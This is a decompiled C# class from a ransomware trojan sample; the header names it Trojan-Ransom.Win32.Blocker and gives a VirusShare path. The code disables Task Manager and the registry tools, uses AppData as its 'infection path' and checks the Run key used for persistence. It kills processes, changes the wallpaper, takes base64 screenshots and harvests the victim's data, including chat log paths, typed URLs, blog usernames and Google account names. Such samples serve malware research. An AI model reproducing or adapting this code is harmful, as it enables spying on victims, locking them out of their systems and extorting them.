// Decompiled with JetBrains decompiler
// Type: n3ux.OS
// Assembly: flu-nucleo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 807F4FF6-398F-45B5-8EC1-50AF57383C19
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.avxv-c9e0300c4b5a251c76c291f23c0d27537f89d4b9.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;

namespace n3ux
{
  internal class OS
  {
    public const string RunKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    public const string SystemKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    private const string DesktopKey = "Control Panel\\Desktop";

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int SystemParametersInfo(
      int uAction,
      int uParam,
      string lpvParam,
      int fuWinIni);

    [DllImport("winmm.dll")]
    private static extern long mciSendString(
      string strCommand,
      StringBuilder strReturn,
      int iReturnLength,
      IntPtr hwndCallback);

    public static bool IsXP() => Environment.OSVersion.Version.ToString()[0].ToString() == "5";

    public static string Version() => Environment.OSVersion.Version.ToString()[0].ToString() + "." + (object) Environment.OSVersion.Version.ToString()[2];

    public static bool IsAdministrator() => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

    public static string InfectionPath() => Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

    public static void KillProcess(string name)
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (process.ProcessName == name)
          process.Kill();
      }
    }

    public static void ChangeWallpaper(string path)
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
      registryKey.SetValue("Wallpaper", (object) path);
      registryKey.Close();
      OS.SystemParametersInfo(20, 0, "(None)", 3);
      OS.SystemParametersInfo(20, 0, path, 3);
    }

    public static void SwitchTaskManager()
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
      int num = (int) registryKey.GetValue("DisableTaskMgr");
      registryKey.SetValue("DisableTaskMgr", (object) (1 - num));
      registryKey.SetValue("DisableRegistryTools", (object) 1);
      registryKey.Close();
    }

    public static string CaptureScreen()
    {
      Rectangle bounds = Screen.AllScreens[0].Bounds;
      Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppPArgb);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
      MemoryStream memoryStream = new MemoryStream();
      bitmap.Save((Stream) memoryStream, ImageFormat.Png);
      string base64String = Convert.ToBase64String(memoryStream.ToArray());
      memoryStream.Close();
      memoryStream.Dispose();
      return base64String;
    }

    public static void PlayAudio(string filename)
    {
      OS.mciSendString("open \"" + filename + "\" type mpegvideo alias MediaFile", (StringBuilder) null, 0, IntPtr.Zero);
      OS.mciSendString("play MediaFile", (StringBuilder) null, 0, IntPtr.Zero);
    }

    public static List<string> getMsnTalks()
    {
      List<string> msnTalks = new List<string>();
      msnTalks.Add("Msn talks:");
      string name = "SOFTWARE\\Microsoft\\MSNMessenger\\PerPassportSettings";
      RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey(name, true);
      foreach (string subKeyName in registryKey1.GetSubKeyNames())
      {
        RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(name + "\\" + subKeyName, true);
        if (registryKey2.GetValue("MessageLogPath") != null)
          msnTalks.Add(registryKey2.GetValue("MessageLogPath").ToString());
      }
      registryKey1.Close();
      return msnTalks;
    }

    public static List<string> getMoviesMade()
    {
      List<string> moviesMade = new List<string>();
      moviesMade.Add("Created movies:");
      string name = "SOFTWARE\\Microsoft\\Windows Live\\Movie Maker\\Recent";
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, true);
      foreach (string valueName in registryKey.GetValueNames())
        moviesMade.Add(registryKey.GetValue(valueName).ToString());
      registryKey.Close();
      return moviesMade;
    }

    public static List<string> getInternetExplorerTypedUrls()
    {
      List<string> explorerTypedUrls = new List<string>();
      explorerTypedUrls.Add("Internet Explorer - Typed URLs:");
      string name = "SOFTWARE\\Microsoft\\Internet Explorer\\TypedURLs";
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, true);
      foreach (string valueName in registryKey.GetValueNames())
        explorerTypedUrls.Add(registryKey.GetValue(valueName).ToString());
      registryKey.Close();
      return explorerTypedUrls;
    }

    public static List<string> getBlogs()
    {
      List<string> blogs = new List<string>();
      blogs.Add("Blogs:");
      string name = "SOFTWARE\\Microsoft\\Windows Live\\Writer\\Weblogs";
      RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey(name, true);
      foreach (string subKeyName in registryKey1.GetSubKeyNames())
      {
        RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(name + "\\" + subKeyName, true);
        if (registryKey2.GetValue("HomepageUrl") != null)
          blogs.Add("Blog: " + registryKey2.GetValue("HomepageUrl"));
        RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey(name + "\\" + subKeyName + "\\Credentials", true);
        foreach (string valueName in registryKey3.GetValueNames())
        {
          if (valueName.Equals("Username"))
            blogs.Add("User: " + registryKey3.GetValue(valueName).ToString());
        }
      }
      registryKey1.Close();
      return blogs;
    }

    public static List<string> getGoogleAccount()
    {
      List<string> googleAccount = new List<string>();
      googleAccount.Add("Google accounts");
      string name = "Software\\Google\\Google Talk\\Accounts";
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, true);
      foreach (string subKeyName in registryKey.GetSubKeyNames())
        googleAccount.Add(subKeyName);
      registryKey.Close();
      return googleAccount;
    }

    public static string getKeyValue(string rKey)
    {
      string empty = string.Empty;
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      foreach (string valueName in registryKey.GetValueNames())
      {
        if (valueName.Equals(rKey))
        {
          try
          {
            empty = registryKey.GetValue(valueName).ToString();
            break;
          }
          catch
          {
            break;
          }
        }
      }
      registryKey.Close();
      return empty;
    }
  }
}
